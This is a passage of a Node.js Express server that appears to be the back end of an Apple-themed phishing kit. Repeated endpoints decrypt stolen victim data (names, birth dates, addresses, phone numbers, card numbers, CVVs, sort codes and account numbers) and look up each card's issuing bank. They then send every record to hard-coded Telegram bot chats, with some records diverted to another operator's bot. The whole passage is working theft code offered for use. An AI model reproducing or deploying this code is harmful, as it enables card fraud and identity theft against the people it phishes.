      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pablo == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `ApplePablo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 784539021,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

let mazCount = 3;

app.post("/sendMazzaAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
        );
        mazCount += 1;
      }
    });
});

app.post("/sendStrictlyAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (count === 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        count = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
        );
        count = count + 1;
      }
    });
});

let sbCount = 15;

let pastebk = 0;

app.post("/applePasteBk", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5358629321,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/applePoka", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

let firstTrust = 0;

app.post("/appleFirstTrust", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (firstTrust == 100) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/appleSB", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (sbCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        sbCount = 9;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5450405437&text=Apple:\n${originalText}`
        );
        sbCount += 1;
      }
      res.send("Update Complete");
    });
});

let p2 = 0;

app.post("/appleP2", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (p2 == 15) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 = 9;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleP2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1265611993,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 += 1;
      }
      res.send("Update Complete");
    });
});

var cdbCount = 0;

app.post("/spooferGooferApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        Spoofergoofer = 6;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSpooferGoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.post("/kelvApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
